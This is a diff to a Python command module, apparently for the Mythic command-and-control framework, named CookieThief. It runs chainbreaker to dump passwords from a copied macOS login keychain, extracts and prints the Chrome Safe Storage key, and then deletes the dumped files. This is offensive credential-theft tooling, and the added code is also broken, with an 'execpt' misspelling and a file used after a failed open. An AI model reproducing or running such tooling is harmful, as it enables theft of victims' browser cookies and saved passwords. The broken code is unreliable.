@@ -4,6 +4,7 @@ import os
 from mythic_payloadtype_container.MythicRPC import *
 import traceback
 import subprocess
+import shutil
 
 class CookieThiefArguments(TaskArguments):
     def __init__(self, command_line):
@@ -85,10 +86,8 @@ class CookieThiefCommand(CommandBase):
             subprocess.run(["python2", "/Mythic/mythic/chainbreaker/chainbreaker.py", "--password=" + password, "--dump-generic-passwords", "tmp_login.keychain-db"])
 
         except Exception as e:
-            #print("Chainbreaker script failed with error: " + str(e))
-            traceback.print_exc()
+            print("Chainbreaker script failed with error: " + str(e))
             sys.stdout.flush()
-            sys.exit(1)
 
 
         try:
@@ -98,7 +97,37 @@ class CookieThiefCommand(CommandBase):
                 print("Temp KeychainDB file does not exist.")
                 sys.stdout.flush()
         except Exception as e:
-            print("Encountered an error attempting to removing the temporary keychainDB file: " + str(e))
+            print("Encountered an error attempting to remove the temporary keychainDB file: " + str(e))
             sys.stdout.flush()
+
+
+
+        fndstr = "Password: "
+        ccs_b64_str = ""
+        ccs_password = ""
+        try:
+            ccs_keyfile = open("/Mythic/mythic/chainbreaker/passwords/generic/ChromeSafeStorage.txt", "r")
+        execpt Exception as e:
+            print("Chrome Safe Storage key file failed to open with error: " + str(e))
+            sys.stdout.flush()
+
+        for line in ccs_keyfile:
+            if fndstr in line:
+                ccs_b64_str = line.split(':', 1)[1].strip()
+                break
+
+        ccs_keyfile.close()
+
+        ##DEBUG:
+        print(ccs_b64_str)
+        sys.stdout.flush()
+
+        try:
+            shutil.rmtree("/Mythic/mythic/chainbreaker/passwords")
+        except Exception as e:
+            print("Failed to delete dumped keys directory with error: " + str(e))
+            sys.stdout.flush()
+
+
 
         return task
